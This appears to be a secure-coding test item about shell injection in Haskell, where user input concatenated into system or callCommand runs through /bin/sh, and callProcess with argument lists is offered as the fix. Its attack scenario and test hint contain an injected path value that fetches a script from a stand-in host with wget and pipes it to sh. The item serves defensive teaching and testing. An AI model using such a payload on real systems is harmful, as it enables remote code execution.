name: Haskell shell command built with string concatenation
attack_scenario: userPath = "/tmp; wget evil/x -O- | sh" executes the injected pipeline.
negative_test_hint: feed userPath = "/tmp; wget evil/x -O- | sh" and assert no injected pipeline executes because arguments go through callProcess, not the shell

exemplar.explanation: system, callCommand and the shell CmdSpec run the string through /bin/sh -c, so concatenating user data into it with ++ is shell injection. callProcess/proc with an argument list bypass the shell entirely, keeping user input inert.
